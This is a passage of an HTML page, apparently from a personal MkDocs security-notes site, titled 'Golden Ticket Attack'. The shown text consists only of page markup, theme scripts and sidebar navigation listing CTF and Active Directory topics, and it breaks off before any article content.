@@ -1,0 +1,2750 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../">
+      
+      
+        <link rel="next" href="../../../linux/">
+      
+      
+      <link rel="icon" href="../../../../assets/images/favicon.ico">
+      <meta name="generator" content="mkdocs-1.6.0, mkdocs-material-9.5.27">
+    
+    
+      
+        <title>Golden Ticket Attack - 0xbara</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.6543a935.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="red">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#extrasids-attack-mimikatz" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../.." title="0xbara" class="md-header__button md-logo" aria-label="0xbara" data-md-component="logo">
+      
+  <img src="../../../../assets/images/logo.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            0xbara
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Golden Ticket Attack
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="red"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3Z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="red"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6zm0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4zM7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.5.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M41.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l160 160c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L109.3 256l137.3-137.4c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-160 160z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08Z"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="0xbara" class="md-nav__button md-logo" aria-label="0xbara" data-md-component="logo">
+      
+  <img src="../../../../assets/images/logo.png" alt="logo">
+
+    </a>
+    0xbara
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../.." class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path d="M10.561 8.073a6.005 6.005 0 0 1 3.432 5.142.75.75 0 1 1-1.498.07 4.5 4.5 0 0 0-8.99 0 .75.75 0 0 1-1.498-.07 6.004 6.004 0 0 1 3.431-5.142 3.999 3.999 0 1 1 5.123 0ZM10.5 5a2.5 2.5 0 1 0-5 0 2.5 2.5 0 0 0 5 0Z"/></svg>
+  
+  <span class="md-ellipsis">
+    About Me
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../Bug-Bounty/" class="md-nav__link ">
+              
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M7.207 0c-.484 0-.877.102-1.182.3-.305.2-.46.463-.46.78v21.809c0 .277.159.528.476.76.315.234.703.351 1.166.351.443 0 .83-.117 1.168-.35.335-.231.506-.484.506-.761V1.08c0-.319-.163-.576-.49-.78C8.064.1 7.671 0 7.207 0zm9.523 8.662c-.483 0-.871.098-1.168.3l-4.439 2.783c-.199.186-.284.469-.247.855.034.383.21.747.524 1.09.314.347.666.563 1.068.655.396.09.697.041.896-.143l1.755-1.095v9.782c0 .277.153.528.461.76.3.234.687.351 1.15.351.463 0 .863-.117 1.199-.35.337-.233.506-.484.506-.761V9.739c0-.32-.165-.578-.49-.776-.325-.203-.73-.301-1.215-.301z"/></svg>
+  
+  <span class="md-ellipsis">
+    Bug Bounty
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Bug Bounty
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Bug-Bounty/reconassiance/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Reconassiance
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../CTF/" class="md-nav__link ">
+              
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.4 6 14 4H5v17h2v-7h5.6l.4 2h7V6h-5.6Z"/></svg>
+  
+  <span class="md-ellipsis">
+    CTF
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            CTF
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_2" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../CTF/HackTheBox/" class="md-nav__link ">
+              
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path d="m8.878.392 5.25 3.045c.54.314.872.89.872 1.514v6.098a1.75 1.75 0 0 1-.872 1.514l-5.25 3.045a1.75 1.75 0 0 1-1.756 0l-5.25-3.045A1.75 1.75 0 0 1 1 11.049V4.951c0-.624.332-1.201.872-1.514L7.122.392a1.75 1.75 0 0 1 1.756 0ZM7.875 1.69l-4.63 2.685L8 7.133l4.755-2.758-4.63-2.685a.248.248 0 0 0-.25 0ZM2.5 5.677v5.372c0 .09.047.171.125.216l4.625 2.683V8.432Zm6.25 8.271 4.625-2.683a.25.25 0 0 0 .125-.216V5.677L8.75 8.432Z"/></svg>
+  
+  <span class="md-ellipsis">
+    HackTheBox
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            HackTheBox
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_2_2" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../CTF/HackTheBox/challenges/" class="md-nav__link ">
+              
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path d="M13.637 2.363h-.001l1.676.335c.09.018.164.084.19.173a.25.25 0 0 1-.062.249l-1.373 1.374a.876.876 0 0 1-.619.256H12.31L9.45 7.611A1.5 1.5 0 1 1 6.5 8a1.501 1.501 0 0 1 1.889-1.449l2.861-2.862V2.552c0-.232.092-.455.256-.619L12.88.559a.25.25 0 0 1 .249-.062c.089.026.155.1.173.19Z"/><path d="M2 8a6 6 0 1 0 11.769-1.656.751.751 0 1 1 1.442-.413 7.502 7.502 0 0 1-12.513 7.371A7.501 7.501 0 0 1 10.069.789a.75.75 0 0 1-.413 1.442A6.001 6.001 0 0 0 2 8Z"/><path d="M5 8a3.002 3.002 0 0 0 4.699 2.476 3 3 0 0 0 1.28-2.827.748.748 0 0 1 1.045-.782.75.75 0 0 1 .445.61A4.5 4.5 0 1 1 8.516 3.53a.75.75 0 1 1-.17 1.49A3 3 0 0 0 5 8Z"/></svg>
+  
+  <span class="md-ellipsis">
+    Challenges
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3_2_2" id="__nav_3_2_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Challenges
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../CTF/HackTheBox/challenges/ancient-encodings/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Very Easy - Ancient Encodings
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../CTF/HackTheBox/challenges/getting-started/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Very Easy - Getting Started
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../CTF/HackTheBox/challenges/lesson/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Very Easy - Lesson
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../CTF/HackTheBox/challenges/questionnaire/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Very Easy - Questionnaire
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_2_3" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../CTF/HackTheBox/machines/" class="md-nav__link ">
+              
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.5.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M384 96v224H64V96h320zM64 32C28.7 32 0 60.7 0 96v224c0 35.3 28.7 64 64 64h117.3l-10.7 32H96c-17.7 0-32 14.3-32 32s14.3 32 32 32h256c17.7 0 32-14.3 32-32s-14.3-32-32-32h-74.7l-10.7-32H384c35.3 0 64-28.7 64-64V96c0-35.3-28.7-64-64-64H64zm464 0c-26.5 0-48 21.5-48 48v352c0 26.5 21.5 48 48 48h64c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48h-64zm16 64h32c8.8 0 16 7.2 16 16s-7.2 16-16 16h-32c-8.8 0-16-7.2-16-16s7.2-16 16-16zm-16 80c0-8.8 7.2-16 16-16h32c8.8 0 16 7.2 16 16s-7.2 16-16 16h-32c-8.8 0-16-7.2-16-16zm32 160a32 32 0 1 1 0 64 32 32 0 1 1 0-64z"/></svg>
+  
+  <span class="md-ellipsis">
+    Machines
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3_2_3" id="__nav_3_2_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Machines
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_2_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_3_2" id="__nav_3_2_3_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Easy
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            Easy
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../CTF/HackTheBox/machines/easy/openadmin/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OpenAdmin
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_2_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_3_3" id="__nav_3_2_3_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Hard
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            Hard
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../CTF/HackTheBox/machines/hard/acute/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Acute
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_3" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../CTF/PortSwigger/" class="md-nav__link ">
+              
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0v24h10.718v-3.805l3.496-4.272h-3.496v-5.205H4.427l6.291-7.767V0Zm13.282 0v3.884L9.786 8.155h3.496v5.205h6.291l-6.291 7.767V24H24V0Z"/></svg>
+  
+  <span class="md-ellipsis">
+    PortSwigger
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            PortSwigger
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../" class="md-nav__link ">
+              
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 4.124c0-.204.021-.401.06-.595l1.956 1.734 2.144-2.38L2.246 1.18c.259-.072.53-.114.812-.114a3.062 3.062 0 0 1 3.058 3.037v.021c0 .152-.012.304-.033.45l2.385 2.112a6.716 6.716 0 0 0-2.013 2.54L3.982 7.037a3.038 3.038 0 0 1-.924.145A3.06 3.06 0 0 1 0 4.124zm20.942 12.694c-.306 0-.601.045-.88.129l-2.308-2.044a6.862 6.862 0 0 1-1.819 2.706l1.993 1.765a3.05 3.05 0 0 0-.044.502 3.06 3.06 0 0 0 3.935 2.929l-1.992-1.77 2.14-2.365 1.981 1.76c.034-.181.052-.364.052-.554v-.026a3.057 3.057 0 0 0-3.058-3.032zm-3.397-7.592 2.473-2.189c.292.093.601.145.924.145A3.06 3.06 0 0 0 23.94 3.53l-1.956 1.734-2.144-2.38 1.914-1.703a3.049 3.049 0 0 0-.812-.114 3.062 3.062 0 0 0-3.058 3.037v.021c0 .152.012.304.033.45l-2.385 2.112a6.716 6.716 0 0 1 2.013 2.54zm-11.3 5.677-2.307 2.044A3.057 3.057 0 0 0 0 19.85v.026c0 .19.018.373.052.554l1.982-1.76 2.14 2.365-1.993 1.77a3.06 3.06 0 0 0 3.935-2.929 3.05 3.05 0 0 0-.044-.502l1.993-1.765a6.862 6.862 0 0 1-1.82-2.706zm8.971 2.657a1.076 1.076 0 1 1-1.961.424h-.192a1.076 1.076 0 1 1-2.127 0h-.15A1.105 1.105 0 0 1 9.7 19.23c-.604 0-1.094-.5-1.094-1.115 0-.21.057-.405.156-.572-1.493-1.142-2.474-3.051-2.474-5.213 0-3.497 2.559-6.332 5.713-6.332s5.713 2.835 5.713 6.332c0 2.173-.991 4.091-2.497 5.231zm-4.194-5.914a1.995 1.995 0 0 0-.559-.66 1.804 1.804 0 0 0-.918-.264 1.45 1.45 0 0 0-.319.036c-.405.05-.747.327-.983.647-.207.257-.368.569-.372.905-.032.278.024.556.075.828.066.322.293.584.55.774.119.095.29.226.44.116.1-.134.016-.33.107-.478a.5.5 0 0 1 .258-.326c.263-.132.527-.262.808-.355.228-.067.416-.219.61-.349.255-.197.424-.558.303-.874zm.996 2.325c-.279-.007-.63 1.237-.574 1.78.175.72.237-.505.574-.506.323.014.275 1.255.53.504.078-.5-.224-1.77-.53-1.778zm4.036-.833c.051-.272.107-.55.075-.828-.004-.336-.165-.648-.372-.905-.236-.32-.578-.596-.983-.647a1.45 1.45 0 0 0-.319-.036c-.32-.001-.644.1-.918.264-.235.171-.42.406-.559.66-.121.316.048.677.303.874.194.13.382.282.61.35.28.092.545.222.808.354a.5.5 0 0 1 .258.326c.091.147.007.344.106.478.151.11.322-.021.44-.116.258-.19.485-.452.551-.774z"/></svg>
+  
+  <span class="md-ellipsis">
+    Hacking
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_4" id="__nav_4_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            Hacking
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" checked>
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../" class="md-nav__link ">
+              
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 1h16a1 1 0 0 1 1 1v4a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1m0 8h16a1 1 0 0 1 1 1v4a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1v-4a1 1 0 0 1 1-1m0 8h16a1 1 0 0 1 1 1v4a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1v-4a1 1 0 0 1 1-1M9 5h1V3H9v2m0 8h1v-2H9v2m0 8h1v-2H9v2M5 3v2h2V3H5m0 8v2h2v-2H5m0 8v2h2v-2H5Z"/></svg>
+  
+  <span class="md-ellipsis">
+    Active Directory
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            Active Directory
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../asreproast/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    ASREPRoast
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
